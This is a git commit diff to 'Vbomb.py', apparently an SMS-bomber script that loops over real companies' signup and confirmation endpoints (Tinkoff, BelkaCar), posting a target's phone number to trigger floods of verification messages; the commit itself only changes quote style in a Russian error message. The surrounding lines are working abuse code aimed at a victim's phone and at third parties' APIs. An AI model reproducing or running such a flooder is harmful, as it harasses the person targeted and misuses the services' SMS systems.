6e85e04489a03dd7101f175785fb440108bbad68
Bobsoc <87860555+Bobsoc@users.noreply.github.com>
2021-08-02 12:55:15 +0000

    Add files via upload

--- Vbomb.py
+++ Vbomb.py
@@ -42,7 +42,7 @@ while True:
         	requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
             print("[+] Tinkoff отправлено!") 
         except Exception as ex: 
-        	print('[-] Tinkoff не отправлено!' + str(ex))
+        	print("[-] Tinkoff не отправлено!" + str(ex))
 
         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
